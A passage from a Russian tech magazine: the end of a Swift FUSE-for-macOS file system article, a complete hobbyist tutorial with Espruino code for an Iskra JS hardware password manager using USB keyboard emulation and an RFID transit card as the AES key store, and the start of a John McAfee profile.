        print("ERROR: \(error.localizedDescription).")
    }
    return nil
}

Этот метод в настоящее время помечен Apple как устаревший, поэтому аль‐
тернативно можно исполь зовать DispatchSemaphore в комплекте с URLSes‐
sionDataTask.
   У вдумчивого читателя к этому моменту должен был возникнуть вопрос:
а как файловая система определяет, показать файл или папку? Для этого
необходимо пере определить еще один метод, attributesOfItem.


override func attributesOfItem(atPath path: String!, userData: Any!)
throws ‐> [AnyHashable : Any] {
    var attributes: [FileAttributeKey : Any] = [:]
    if path == "/" {
        return attributes
    }
    let album = vkService.getAlbum(forPath: path)
    if  (album != nil) {
        attributes[FileAttributeKey.type] = FileAttributeType.typeDi
rectory
    } else {
        attributes[FileAttributeKey.type] = FileAttributeType.typeRe
gular
    }
    return attributes
}

Здесь мы определяем, какие атрибуты выставить для файла по заданному
пути. Я проверяю, если мы можем получить альбом для этого пути, то выс‐
тавляем тип «Директория», иначе — «Файл». Для корневой директории нам
не требуется возвращать никаких атрибутов.





   Отображаем альбомы и фотографии из VK в нашей файловой сис теме


ЧТО ДАЛЬШЕ?
В сегодняшнем материале мы рассмат ривали при меры исключительно read‐
only‐систем, но нужно понимать, что реализовать запись и удаление файлов
тоже не сложно: достаточно аналогичным спо собом переопределить соот‐
ветствующие методы, с полным перечнем которых ты можешь ознакомиться
в заголовочном файле OSXFUSE/OSXFUSE.h. Еще хотелось бы обратить вни‐
мание, что метод contents(atPath:) не единс твенный способ вернуть
содержимое файла, для более слож ных случаев можно реализовать пол ный
цикл open/read/release, и авторы библиотеки рекомендуют именно этот спо‐
соб, как более производитель ный.
   Также за кадром осталось то, что FUSE for macOS умеет генерировать
события для Notiﬁcation Center, на которые можно подписаться (например,
открывать  Finder после  того,  как система примонтировалась). Пример
использования ты также найдешь в исходниках.


ВЫВОДЫ И ПРЕДОСТЕРЕЖЕНИЯ
C одной стороны, FUSE for macOS — самый простой способ реализовать
собственную файловую систему для macOS, который предоставляет верхне‐
уровневый и довольно удобный интерфейс для опи сания ее поведения.
На другой чаше весов мы имеем следующие недостатки: очень слабая
документация — практичес ки единс твенным источником знаний по этому
проекту служат примеры авторов на GitHub; низкий уровень активности в про‐
екте — хотя авторы в рассылке утвержда ли, что не забросили проект, дож‐
даться ответов на свои воп росы в  Issues на GitHub почти нере ально.
Еще хотелось бы отметить пло хо про работанную сис тему ошибок: если ты
сделал что‐то неправильно, ско рее всего, тебе не прилетит ошибка, а просто
перестанут отображать ся файлы без каких‐либо логов в консоли и прочего.
Резюмируя вышесказанное: прежде чем исполь зовать этот проект в продак‐
шене, ты должен быть морально готов самостоятель но раз бираться с боль‐
шинством проблем и закладывать в оценку проекта воз можные риски.


        WWW

                      •Сайт проекта
                     •Репозиторий с примерами реализованных фай‐
                        ловых систем
КОДИНГ

 ТВОРЧЕСКАЯ
   ISKRA





  ДЕЛАЕМ АППАРАТНЫЙ МЕНЕДЖЕР ПАРОЛЕЙ
С ЭМУЛЯЦИЕЙ USB‐КЛАВИАТУРЫ, БЛЕК‐ДЖЕКОМ
       И КРАСИВЫМИ МЕНЮШКАМИ




Где   хранить   свои   суперсекьюрные
и регулярно обновляемые пароли от мно‐
жества интернет‐ресурсов? В голове? Ско‐
рее всего, не поместятся. На бумаж ке?
Не по‐хакер ски. Доверять облачному сер‐              ge0gr4f                                                                                         ge0gr4f@gmail.com
вису, который спалит пароли если не сегод‐
ня, то завтра обязательно? Понадеяться
на опенсорсный менеджер паролей? Вяло,
товарищи! Скучно!


Сегодня мы рассмотрим нас тоящий тру‐хакерский, тру‐гиковский, удобный
и безопасный способ хранить пароли, создав свой аппаратный менеджер
паролей! Он будет хранить в себе данные раз ных аккаунтов, логины и зашиф‐
рованные пароли, ключ от которых должен держать ся отдельно и вводиться
непосредственно перед использованием, и при этом устройство будет эму‐
лировать USB‐клавиатуру для вывода логина и пароля.


НЕТ ДЫМА БЕЗ ОГНЯ, ИЛИ НЕМНОГО ПРЕДЫСТОРИИ
Идея родилась не на пус том месте. Незадол го до ее появления я решил
заняться программированием микроконтроллеров. Но так как свободного
времени, чтобы серьезно и глу боко пос вятить себя этому, было недос таточно
для полноценного освоения ни железного С++, ни железобетонного ассем‐
блера, то, чуть не споткнувшись о продолжающую набирать популярность
вселенную Arduino, я пря миком уго дил в объятия загадочного мира «Java‐
Script для микроконтрол леров». «Теперь гаджеты программируют на Java‐
Script» — этот броский заголо вок поймал меня на крючок! Разглядывая
на сайте «Амперки» изоб ражения красивой отладочной платы, похожей на Ar‐
duino Leonardo, но белой и именуемой Iskra JS (не путать с Iskra Neo, которая
тоже Iskra, тоже белая, но по сути улучшенная Leonardo), я попал под гипноз
описания ее возможностей (и, если что, нахожусь под ним до сих пор).





                    От ладочная плата Iskra JS

Сердце  платы  Iskra JS —  прекрасный  дуэт микроконтрол лера серии
STM32F4 и прячущейся в его недрах могучей open source прошивки Espruino,
выпол няющей функцию интерпретато ра языка JavaScript с торчащей наружу
консолью а‐ля REPL. Те, кто зна ком с Node.js, почувствуют ярко выраженное
дежавю и смогут вести себя более уверенно в диалоге с Espruino. При всем
при этом для Iskra JS подходит весь спектр аксессуаров от Arduino UNO R3.
Да и дополнительные библиотеки, представляющие собой JS‐модули, име‐
лись в достаточном количес тве как от создателей проекта Espruino, так и от
разработчиков Iskra JS.


«Зачем все это», или не купить ли нам ком мерчес кий токен
Можно посмотреть и в сторону коммерчес ких токенов. Но тут скры вается
пласт нюансов с дополнитель ным ПО и уни версаль ностью. Да и за действи‐
тельно интересные устройства придется выложить немаленькую сумму.


Итак, недолго раздумывая и сра зу обзаведясь целым набором «Йодо», где,
помимо платы Iskra JS и буклета, были шилды, модули с сенсорами и прочими
кнопочками, а также детали необычного конструктора для макетирования
корпусов, именуемого структором, я всецело пог ряз в творчес тве. :) И вот
тогда, наткнувшись в буклете на один из проектов с примером использования
эмуляции клавиатуры, я и загорелся идеей сделать «ленивку», набирающую
за меня пароли.
  Идея зре ла дол го, ее каждый раз подрезали вся кие умные роботы и дома,
GSM‐сигнализации и прочие радости творчества. Ведь программирование
для Iskra JS приносило мас су удо вольствия, так как не было обременено пос‐
редническими  процес сами —  ни  предваритель ным  компилированием,
ни обязательной прошивкой платы.


             INFO

                     Процесс прошивки в Espruino‐based платах тре‐
                        бует некоторых разъяснений. Прошив ка в мик‐
                       роконтроллере одна — и это Espruino. Она про‐
                    шивается   единожды   и   занимает   часть
                     флеш‐памяти мик рокон троллера. В дальнейшем
                       для сохранения вашего JavaScript‐кода исполь‐
                         зуется оставшееся место во флеш‐памяти. И вот
                       очистку  части  флеш‐памяти  от  старого  кода
                      и запись нового нередко так же называют про‐
                    шивкой,  хотя  правильнее  все  же  называть
                        это сохранением кода.



Вре мя приш ло
День, когда лень набивать длинные пароли руками победила в первенстве
приоритетов, все‐таки настал. И тогда пришло время сформировать пред‐
ставление о том, каким я вижу свое будущее устройство, а заодно и сос‐
тавить список требований и деталей.
 • Для хранения логинов и паролей была выб рана карта microSD. Для работы
   с ней, соответственно, необходим модуль для чтения карт.
 • В роли управления решил задействовать ИК‐пульт и модуль с ИК‐при‐
  емником, которые дос тались с набором, так как кнопок пульта заведомо
  было достаточ но для воз можного будущего расширения, в то время как с
   размещением новых физических кнопок могли бы возникнуть проблемы,
   да и дистанционность имеет свои плюсы в использовании.

Далее необходимо было определить ся, на чем хра нить ключ AES‐256 и на
чем показывать меню.
 • Так как у «Амперки» не было на тот момент собственных модулей с дис‐
   плеем, целостную картинку пришлось нарушить и воспользоваться китай‐
   ским модулем с OLED‐дисплеем с ярким экраном диагональю 0,96 дюйма
   и с подключением по шине I2C (как показа ла практика, если собираешься
   управлять своим менеджером с расстояния более двух метров, то удоб‐
   ней все же будет использовать экран больших размеров).
 • Для хранения клю ча пос ле недолгих поисков была выбрана транспортная
   карта «Единый», работающая по технологии RFID и, как обнаружилось,
  имеющая  небольшую  область  памяти,  сво бодную  для  перезаписи.
  Попадаются карты «Единый» с 80 и 164 байт памяти. Хранится информа‐
   ция страницами по четыре байта. У тех, что со 164 байт на борту,
   есть 80 байт, свободных для переза писи (с 16‐й по 35‐ю страницу
   при счете с 0). Таких израсходованных карт у меня оказалось приличное
   количество. Свою роль сыграло и то, что у «Амперки» была пол ноценная
   и  настроенная  на  работу  с  картами  «Единый»  JS‐библиоте ка
   для NFC/RFID‐модуля на основе микросхемы NXP PN532, что дает сти‐
   мул покопаться в ней глуб же для более деталь ного изу чения принципов
   работы с RFID/NFC‐метками.

Определившись со списком, можно было прис тупать к сборке прототипа
и программированию.
  Изначально за основу была взята отладочная плата Iskra JS с допол‐
нительной платой расширения. Про тотип на ней получился громоздким, чуд‐
ным и по‐своему симпатичным.





                  Первый прототип без корпуса





              Первый прототип в кор пусе из структора

Позже  появилась  мини‐версия  старшей  платы —  Iskra  JS  mini  c
STM32F411CEU6 на борту, и это позволило сущес твенно сократить размеры
устройства и сде лать его мобильным.





                  От ладочная плата Iskra JS mini

Вот на ее основе мы и соберем наше устройство.


ПОДГОТОВКА
Для начала необходимо установить среду раз работки, и если ты собираешь‐
ся работать с платой из‐под винды, то понадобят ся драйверы. Подробно
об установке среды раз работки можно почитать на вики проекта Iskra JS.
   Если же не поль зуешься браузером Google Chrome, то можно установить
нативные приложения для Windows с сайта про екта Espruino либо самос‐
тоятельно клонировать текущую версию среды раз работки с GitHub и запус‐
тить ее локально с помощью фреймворка NW.js, просто скопировав все фай‐
лы среды в папку с фреймворком и запус тив исполня емый файл nw.
   Главное — не забудь поменять в Espruino Web IDE настройки для работы
с платами и дополнительными библиотеками от «Амперки»:
 • В разделе SETTINGS → COMMUNICATIONS:
    • в поле Module URL ука жи http://js.amperka.ru/modules
    • в поле Module Extensions ука жи .min.js|.js
    • в поле Save on Send выбери Direct to Flash

 • В разделе SETTINGS → BOARD:
    • в поле Board JSON URL ука жи http://js.amperka.ru/json

Окно среды разработки состоит из двух частей: справа — редактор кода,
слева — консоль интерпретатора Espruino, дос тупная при соединении с отла‐
дочной платой.





                Среда разработ ки Espruino Web IDE


Сборка про тотипа и под ключение
Подключим физически все наши модули, раз местив на беспаечной макетной
плате. Что она собой представляет и как с ней работать, можно почитать
здесь.





              Прототип устрой ства на макетной плате

Выведем питание с пина 3V3 отладоч ной платы Iskra JS mini на дорожку +
макетной платы, а «землю» — с пина GND на –.
  OLED-экран с подклю чением по шине I2C имеет четыре контакта: GND,
VDD (VCC), SCK (SCL), SDA. Подключим их к соответствующим пинам на пла‐
те:
 • GND — к –,
 • VDD — к +,
 • SCK — к пину B10,
 • SDA — к пину B3.

ИК‑приемник имеет три кон такта:
 • G — к –,
 • V — к +,
 • S — к пину A1.

RFID/NFC-модуль имеет пять контактов для подключения к отладочной пла‐
те (помимо I2C пинов D (SDA) и C (SCL), исполь зуется еще пин прерывания
Q), а также три контакта для подключения внешней антенны (X, G, X):
 • G — к –,
 • V — к +,
 • Q — к пину B4,
 • D — к пину B9,
 • C — к пину B8,
 • X, G, X — к соответству ющим контактам на антенне.

Модуль чте ния карт microSD подключается по шине SPI и име ет шесть
контактов:
 • G — к –,
 • V — к +,
 • CS — к A4,
 • DI (MOSI) — к B15,
 • DO (MISO) — к B14,
 • SCK — к B13.


КАК ЭТО ДОЛЖНО РАБОТАТЬ?
Прежде чем начать программировать, неплохо бы подытожить наши пред‐
ставления о том, как у нас все это должно работать. Итак.


Прин цип работы
На карте microSD хранятся открытые логины и зашифрованные с помощью
AES пароли (при желании можно и логины зашифровать). На ПК/планшете/ТВ
выставляем курсор в поле вво да логина, а на «ленивке», с помощью кнопок
вверх‐вниз на пульте, в меню выбира ем аккаунт и, нажав на пульте X и при‐
ложив карту «Единый» к RFID‐сканеру, начина ем эмуляцию ввода логина.
Для ввода пароля нажима ем на пульте Y. Кнопкой пульта Z можно отменить
сделанный ранее выбор вво да. Кнопкой + добавляем новые аккаунты.





                     Пульт для менеджера паролей


Пароли
Длина пароля ограничена 32 символами. Поддерживаемые символы: 0–9, a–
z, A–Z, ‐=[];'`.,/~!@#$^&*()_+<>?{}":|, про бел. Пол ный перечень под‐
держиваемых символов и кодов можно пос мотреть в ис ходном коде модуля
@amperka/usb‐keyboard.js. Знак % использует ся для дополнения паролей
длиной меньше 32 символов и не должен встречаться в самом пароле.


До бавление новых аккаунтов
На карте microSD с файловой системой FAT32 в пап ке db создаются файлы
без расширения, содержащие логин и пароль, разделенные тройным Enter.
Имя файла будет названием пункта меню.





                  Файл аккаунта до кодирования

Вставляем карту, включаем «ленивку». На экра не появится над пись Password
Manager, а затем меню с заголовком Select Account (при первом запуске пус‐
тое). Нажимаем на пульте кнопку +, по запросу прикладываем карту «Единый»
и дожидаемся надписи Encrypted и появления меню с добавленны ми пункта‐
ми (аккаунтами). При этом в файлах на карте пароли будут зашифрованы,
а сами файлы получат расширение .enс.





                Файл аккаунта после кодирования





                          Вид меню

Теперь, имея полное представление о том, что у нас должно получиться,
приступим к программирова нию.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
   ТВОРЧЕСКАЯ ISKRA
          ДЕЛАЕМ АППАРАТНЫЙ МЕНЕДЖЕР ПАРОЛЕЙ
            С ЭМУЛЯЦИЕЙ USB‐КЛАВИАТУРЫ, БЛЕК‐
             ДЖЕКОМ И КРАСИВЫМИ МЕНЮШКАМИ





ПРОГРАММИРОВАНИЕ
Интерпретатор Espruino по большей части основывается на ECMAScript 5,
но за последнее время про шивка обза велась и приличным набором воз‐
можностей из ES6. И стиль написания программ зависит теперь лишь от тво‐
их привычек. Но надо помнить, что точку с запятой интерпретатор за тебя
не поставит. Так что будь внимателен.


             INFO

                     На Iskra JS, даже не запуская собственной среды
                       разработ ки Espruino Web IDE, можно просто под‐
                     ключиться  к  виртуальному  последова тельному
                      порту   через   USB‐соединение   (например,
                        с помощью программы screen в Unix‐based ОС)
                      и получить доступ к кон соли интерпретатора, где
                        в  реальном  времени можно  как  подпра вить
                      текущий код, так и испробовать новый.
                      Достаточно  использовать  встроенную  фун‐
                      кцию‐коман ду  reset(),  и  микроконтроллер
                      сбросит свое состояние, но не будет запускать
                          код,  сохраненный  во  флеш‐памяти,  пока мы
                      не скомандуем load(), а до тех пор мы вольны
                        сколько  угодно  экспериментировать  с  кодом,
                      не  заботясь  о  «старом»  кон тексте.  Вкупе
                       со встроенными в интерпретатор подсказками
                      и авто дополнением это экономит уйму времени
                      и добавляет динамики процессу…


Итак, приступим. Запустим Espruino Web IDE, перейдем в окно редактора
кода и начнем наше безоб разие.
  В первую очередь подключим библиотеку, которая сконфигурирует нашу
плату как HID‐устрой ство — USB‐клавиату ру и добавит функциональность
для управле ния эмуляцией.


var kb = require('@amperka/usb‐keyboard');

Далее настроим шину SPI для работы с модулем чтения карт:


SPI2.setup({mosi:B15, miso:B14, sck:B13});

Подключим сам модуль:


E.connectSDCard(SPI2,A4);

и библиоте ку для работы с файловой системой FAT32:


var fs=require("fs");

Подключим библиотеку для работы с модулем ИК‐при емника:


var IRR = require('@amperka/ir‐receiver').connect(A1);

Настроим I2C1 для работы c RFID/NFC‐модулем:


I2C1.setup({sda: B9, scl: B8, bitrate: 400000});

Подключим и настроим библиотеку для работы с RFID/NFC‐модулем на шине
I2C1 с пином пре рывания B4. Библиотека настро ена на работу с метками Mi‐
fare Ultralight.


var nfc = require('@amperka/nfc').connect({i2c: I2C1, irqPin: B4});

Создадим массив для временного хра нения клю ча.


var key = [];

Зададим переменную для скорос ти набора текста в виде задержки в мил‐
лисекундах между вводом символов:


var typeSPEED = 100;

Зададим переменную busy для защиты от повторного запроса с пульта
во время обработки предыду щего:


var busy = 0;

Зададим длину пароля и AES‐ключа в байтах:


var keylen = 32;

Создадим  триггеры  для  активации  считыва ния ключа  с  карты  в  key
при кодировании и декодирова нии:


var nfc_on_enc = 0;
var nfc_on_dec = 0;

Создадим триггер для определения типа вывода: логин (= 1) или пароль (= 0):


var ilogin = 0;

Зададим переменную для временного хранения логина:


var ltemp = '';

Зададим переменную для временного хранения зашифрованного пароля:


var temp='';

Создадим массив для хра нения имен новых файлов с логинами/паролями:


var f2enc = [];

Зададим разделитель, с помощью которого отделяются логин и пароль
в файле. В дан ном случае раз делителем будут три символа новой строки
в Unix‐ и Windows‐фор мате.


var spru = '\n\n\n';
var sprw = '\r\n\r\n\r\n';

Создадим объект меню.


var mainmenu = {
  "" : {
    "title" : "Select Account",
    "fontHeight": 15
  }
};

Теперь создадим функцию для чтения пап ки с файлами логинов/паролей,
создания на их основе пунктов меню и присвоения им значений логинов
и зашифрованных паролей для переда чи на обра бот ку при выборе. Имя фай‐
ла становится названием пункта меню (без рас ширения .enc).


function readDB(){
  var dbfiles = fs.readdirSync("db");
  dbfiles.forEach(function(b){
    if(b!=='.' && b!=='..' && b.indexOf(".enc")>0){
      var ff = fs.readFile('db/'+b).split(spru);
      mainmenu[b.slice(0,‐4)] = function(){
        ltemp = ff[0];
        temp = ff[1];
        ldraw('INPUT CARD');
        if(!nfc_on_enc) nfc_on_dec = 1;
      };
    }
  });
}

Подключим  библиотеку  графичес кого меню  и  создадим  переменную
для управле ния им. Под робнее о работе с меню можно прочитать здесь.


var menu = require("graphical_menu");
var m;

Подключим библиотеку со шрифтом и добавим в стандартную библиотеку
Graphics:


require("Font8x16").add(Graphics);

Создадим стартовую функцию, выполняющуюся при инициализации экрана.
В ней мы установим раз мер шрифта с помощью метода setFont8x16()
и вызовем функцию генера ции меню.


function start(){
  var err = 0;
  oled.setFont8x16();
  try{ readDB();}catch(e){ err = 1;}
  if(err){ ldraw('SD CARD ERROR'); }
  else{ mShow("PASSWORD MANAGER",5000);}
}

Настроим шину I2C2 для работы с экраном, подклю чим библиотеку, выполнив
стартовую функцию.


I2C2.setup({scl:B10,sda:B3});
var oled = require("SSD1306").connect(I2C2,start);

Создадим функцию отрисовки заданного текста на экране на заданное вре мя
с последующим возвращением в меню.


function mShow(text,ms){
  ldraw(text);
  setTimeout(()=>{m = menu.list(oled, mainmenu);},ms);
}

А также функцию отрисовки текста посередине экрана с помощью метода
drawString().


function ldraw(text){
  oled.clear();
  oled.drawString(text,(64‐(text.length/2)*8),26);
  oled.flip();
}

Далее создадим функцию эмуляции набора текста на клавиату ре. На текущий
момент выставле на ско рость десять символов в секунду (typeSPEED =
100 мс), так как с боль шей скоростью могут возникнуть пропус ки символов.
Эмуляция клавиатуры на Espruino — штука порой кап ризная. :)


function ktype(str){
  var cnt = 0;
  var fcnt = str.length;
  var int1 = setInterval(()=>{
    kb.type(str[cnt++]);
    if(cnt>=fcnt){
      clearInterval(int1);
      temp='';
      busy = 0;
      mShow('OK',1000);
    }
  },typeSPEED);
}

Теперь перейдем к функции кодирования пароля при помощи AES средства‐
ми встроенной библиотеки crypto. По умолчанию 256 бит — 32 символа
пароля максимум и 32 байт ключа. Пароли меньше 32 знаков добиваются
до 32 символом %. Затем при декодировании эти символы отбрасываются,
поэтому в самом пароле % не должен использовать ся. При необходимос ти
выбери другой не используемый в паролях символ на свое усмотрение.
  Максимальную длину пароля можно уменьшить до 24 и 16 символов,
поменяв значение длины клю ча keylen и изменив номера считываемых с кар‐
ты страниц в p2read. Делай это до того, как будешь добавлять пароли:
декодирование паролей дру гой раз мернос ти будет некорректным.


function Enc(text,key){
  var fil = '%';
  while(text.length<keylen){ text+=fil;}
  var enc = AES.encrypt(text,key);
  var enc_t ='';
  enc = enc.toString().split(',');
  enc.forEach(function(a){enc_t+=String.fromCharCode(a);});
  return enc_t;
}

Ну и как же без функции декодирования.


function Dec(text,key){
  var dec = AES.decrypt(text,key);
  dec = dec.toString().split(',');
  var dec_t = '';
  dec.forEach(function(a){dec_t+=String.fromCharCode(a);});
  return dec_t.split('%')[0];
}

Создадим функцию про верки на наличие в папке db новых файлов с логина‐
ми/паролями без расширения .enc определен ного формата (логин и пароль
разделены символами, заданными раз делителем spr). Найдя такие фай лы,
функция создаст массив с именами файлов для кодирования.


function chkf2enc(){
  f2enc=[];
  var files = fs.readdir("db");
  files.forEach(function(a){
    if(a!=='.'&&a!=='..'&&a.indexOf(".enc")==‐1) f2enc = f2enc.concat
(a);
  });
  if(f2enc.length>0){
    ldraw('INPUT CARD');
    nfc_on_enc = 1;
  }else{
    mShow('NO NEW PASSWORDS',2000);
  }
}

Функция считывания значений страниц карты «Единый», заданных в мас сиве
p2read.


function cRead(p,callback){
  if(p.length!==0){
    nfc.readPage(p[0], function(error, buffer){
      if(error){ }
      else{
        key = key.concat(buffer);
        p.shift();
      }
      if(p.length!==0){
        cRead(p,callback);
      }else{
        callback();
      }
    });
  }
}

Создадим функцию, вызываемую при получении клю ча, для выполнения одно‐
го из следующих действий: кодирования новых паролей, вывода логина,
декодирования и вывода пароля. При обработке новых файлов с логинами/
паролями в случае неправиль ного формата файла ему присвоится рас‐
ширение .err.


function gKey(rkey){
  if(nfc_on_enc){
    nfc_on_enc = 0;
    if(rkey.length==keylen){
      f2enc.forEach(function(a){
        var ft = fs.readFile('db/'+a);
        var spr = '';
        var ferr = 0;
        if(ft.indexOf(sprw)>=0){
          spr = sprw;
        }else if(ft.indexOf(spru)>=0){
          spr = spru;
        }else{
          ferr = 1;
        }
        if(!ferr){
          var t = ft.split(spr);
          var tt = t[1].split('\n')[0].split('\r')[0];
          var enct = Enc(tt,rkey);
          fs.writeFile('db/'+a+'.enc',t[0]+spru+enct);
          fs.unlink('db/'+a);
        }else{
          ldraw('Error format');
          fs.writeFile('db/'+a+'.err',ft);
          fs.unlink('db/'+a);
        }
      });
      readDB();
      busy = 0;
      mShow('Encrypted',2000);
    }
    f2enc=[];
  }else if(nfc_on_dec){
    nfc_on_dec = 0;
    if(ilogin){
      ldraw('Typing LOGIN');
      ktype(ltemp);
      temp = '';
      ltemp = '';
    }else{
      var fd = Dec(temp,rkey);
      ldraw('Typing PASSWORD');
      ktype(fd);
      temp = '';
      ltemp = '';
    }
  }
  key=[];
}

После создания всех переменных и функций прис тупим к обработке событий
и управлению. Активируем RFID/NFC‐модуль, который запус тит событие tag
при обнаружении RFID‐карты.


nfc.wakeUp(function(error){
  if(error){
    ldraw('NFC ERROR');
  }else{
    nfc.listen(); // Слушаем новые метки
  }
});

Теперь зададим обработку события tag при обна руже нии RFID‐карты. Ключ
считывается только при nfc_on_enc=1 или nfc_on_dec=1. Массив p2read
содержит номера восьми страниц для считыва ния с карты метро значений,
используемых в роли клю ча. Значения страниц можешь выбирать сам
из диапазона 16–35. Помним, что одна стра ница содержит четыре байта
и что страниц в массиве должно быть восемь.


nfc.on('tag', function(error, data){
  if(error){
    mShow('tag read error',1000);
  }else{
    if(nfc_on_enc||nfc_on_dec){
      busy = 1;
      key = [];
      var p2read = [16,18,20,22,24,26,28,30];
      cRead(p2read,()=>gKey(key));
    }
  }
  setTimeout(function(){
    nfc.listen();
  }, 1000);
});

Завершает код обработчик кодов ИК‐пульта (в данном случае фирменный
пульт от «Амперки»). Удержание нажатой кноп ки пульта не учитывается. Busy
не дает выполнять сле дующую операцию, пока не завершена предыдущая,
защищая от коллизий.


IRR.on('receive', function(code, repeat){
  if(repeat){
  }else{
    if(!busy){
      switch(code){
      case 378101919: // ВВЕРХ — переход вверх по меню
          m.move(‐1);
        break;
      case 378124359: // ВНИЗ — переход вниз по меню
          m.move(1);
        break;
      case 378132519: // ПЛЮС — проверка на наличие новых файлов с
логинами/паролями
          chkf2enc();
        break;
      case 378089679: // X — вывод логина
          ilogin = 1;
          m.select();
        break;
      case 378122319: // Y — вывод пароля
          ilogin = 0;
          m.select();
        break;
      case 378105999: // Z — отмена ввода ключа
          nfc_on_enc = 0;
          nfc_on_dec = 0;
          mShow('Canceled',1000);
        break;
      }
    }
  }
});

Вот и весь код. Понятно, что его можно написать лучше и возможностей при‐
лепить побольше, но это уже на растерза ние тебе. Если же кто захочет воп‐
лотить его на стар шей Iskra JS, то в коде надо будет поменять только пины
подклю чения модулей.
   Теперь самое время сохранить код во флеш‐памяти микроконтроллера.
Для  этого  нажмем  на  иконку  с  изоб ражением  микросхемы  Send
to Espruino. Так как в нас трой ках мы выб рали пункт Direct to Flash, то код
с автоматически подгру женными библиотеками сохранится в памяти мик‐
роконтроллера.
   Теперь остается толь ко переподключить плату к USB‐порту для того, чтобы
плата воспринялась как HID‐устройство.


А как же соз дать ключ?
Конечно, прежде чем считать ключ, мы должны сначала его создать. Теперь
нам нужен код, который понадобится для записи случайных значений в сво‐
бодную область памяти карты (в те самые 20 свободных страниц, часть
которых мы будем исполь зовать в роли 256‐битного ключа AES).
  Для этого можно использовать представленный ниже код, управлять им
будем из консоли интерпретатора при помощи выполнения введенных вруч‐
ную следующих команд‐функций:
 • rw() — выполнение этой функции переключит в режим генерации случай‐
   ных значений и записи на карту «Единый» в страницы с 16‐й по 35‐ю.
  Набери в консоли (левой час ти IDE) rw() , нажми Enter и при ложи карту
   «Единый» — произой дет запись на карту;
 • ro() — выполнение этой функции переключит в режим чтения карты
   и вывода в консоль зна чений страниц.





  Пример результата работы кода для записи на карту случайных значений


I2C1.setup({sda: B9, scl: B8, bitrate: 400000});
var nfc = require('@amperka/nfc').connect({i2c: I2C1, irqPin: B4});
// Подключаем модуль генератора случайных чисел
// на основе аппаратного генератора E.hwRand()
var hwr = require("@amperka/hw‐random");
var rnd = () => hwr.int(0,255);
var card = {p:0,err:0};
var m = false; // Триггер режимов false — чтение, true — запись
var rw = () => m = true;
var ro = () => m = false;
// Функция считывания значений страниц (page) с карты «Единый»
function cRead(){
  nfc.readPage(card.p, function(error, buffer){
    if(error){
      card.err++;
      console.log('read page error');
    }else{
      console.log((card.p + " : " + buffer));
      card.p++;
      card.err = 0;
    }
    if(card.err<=3){
      setTimeout(cRead,4);
    }
  });
}
// Функция записи случайных значений в страницы с 16‐й по 35‐ю карты
«Единый»
function cWrite(){
  if(card.p<36){
    nfc.writePage(card.p, [rnd(), rnd(), rnd(), rnd()], function(
error){
      if(error){
        print('write page ERROR');
      }else{
        print('write page OK');
      }
    });
    card.p++;
    setTimeout(cWrite,10);
  }
}
// Активируем RFID/NFC‐модуль
nfc.wakeUp(function(error){
  if(error){
    console.log('nfc error');
  }else{
    nfc.listen(); // Слушаем новые метки
  }
});
nfc.on('tag', function(error, data){
  if(error){
    console.log('nfc tag error');
  }else{
    card.p=0;
    card.err=0;
    if(!m) cRead();
    if(m){card.p=16; cWrite();}
  }
  setTimeout(function(){
    nfc.listen();
  }, 3000);
});

Во что можно переделать этот код и как еще можно использовать карты «Еди‐
ный», будет твоим домашним заданием и тестом на богатую фантазию. ;)


УПАКОВКА
После того как все зарабо тало, можно подумать и об упаковке. Вари антов
много: спроектировать корпус и распечатать его на 3D‐принтере, найти
какой‐нибудь бокс в своих закромах, а можно просто купить корпус в магази‐
не.
   Лично у меня получился временный и местами корявенький прототип,
который дожидается своего апгрейда.





                    Рабочий про тотип «ленивки»
GEEK
НЕУЛОВИМЫЙ
ДЖОН





      Колин Фостер
     Поэт. Криптоэнтузиаст
         https://foster.ga
           colin.patrick.
       foster@gmail.com





     КАК 100 МИЛЛИОНОВ ДОЛЛАРОВ
   ИЗМЕНИЛИ ЖИЗНЬ ПРОГРАММИСТА





 Джон Макафи — пионер криптобезо пасности, миллионер
 и криптоэнтузиаст. Начав карь еру полвека назад, он и сей‐
 час будоражит общественность и рынки своими прог нозами
 и всегда готов к активным действиям. Что движет этим неп‐
 ростым человеком? Нонконформизм, алчность, честолюбие,
 жажда внимания, паранойя? Мы пройдемся по цветастому
 послужному спис ку Макафи, а ты выберешь сам!


 ДЖОН МАКАФИ: ЧЕЛОВЕК И АНТИВИРУС
 Макафи родился  в живописном местечке Форест‐оф‐Дин британского
 графства Глостершир в год окончания Второй мировой войны. Вскоре семья
 переехала в США, штат Виргиния. Отец, работавший геоде зистом, страдал
 алкоголизмом. Джону было пят надцать лет, когда отец покончил с собой.
 Во многих интервью Макафи говорил, что каждое утро просыпается с этим
 фактом.
   «Если ты помнишь шестидесятые — тебя в них не было» — гласит старая
 американская присказка. Оста вим за кадром, как Джон Макафи провел «лето
 любви» с «Марией и Хуаной». В конце шес тидесятых Макафи работает в ком‐
 пании, кодирующей перфокарты. Здесь он обучается основам программи‐
 рования. В железнодорож ной компании Missouri Paciﬁc Railroad на новейшем
 мейнфрейме IBM он настраивает расписание движения поездов, параллель‐
 но употребляя тяжелые психоделики. Пришлось уволиться, чтобы не пустить
 поезда под откос.
   Макафи переезжает в Кремниевую долину в начале семидесятых. Работа‐
 ет программистом в одной из лабора торий NASA, проектировщиком прог‐
 раммного обеспечения в компании UNIVAC, архитектором операционных
 систем в Xerox, консультантом по программному обес печению в Computer
 Sciences Corporation и Booz Allen Hamilton. В качес тве допинга Макафи
 использует традиционный шотландский виски и набирающий популярность
 кокаин.
   Восьмидесятые, начало информа ционной эры. Джону Макафи уже трид‐
 цать пять, и он решил подзавязать с наркотика ми. По легенде, во вре мя
 работы в аэрокосмической компании Lockheed наш герой знакомится с пер‐
 вым компьютерным вирусом для MS‐DOS — Brain, разработанным братьями
 Амжадом и Базитом Алви из Пакистана. Прог рамма должна была наказать
 местных пиратов, ворующих ПО у их фир мы. Неожиданно для всех Brain
 вышел за границы Пакистана, и заражения начались по всему миру.
 Летом 1987‐го только в США вирус подхва тили восемнадцать тысяч компь‐
 ютеров.





      Я неп лохо раз бира юсь в людях. Почему появ ляются граф фити на сте-
       нах? Людям нра вится пор тить вещи. Хакеры будут всегда.

 Это вдохновило Макафи открыть антивирусную компанию — McAfee As‐
 sociates. Распространять софт по модели shareware — тоже его идея. К концу
 восьмидесятых компания, первоначально базирующаяся в его собственном
 доме, приносит Макафи пять миллионов вечно мертвых пре зидентов в год.
 Его антивирусные программы используют крупнейшие в мире предприятия,
 но его компании все еще нет в их числе. В 1992 году он проводит свою пер‐
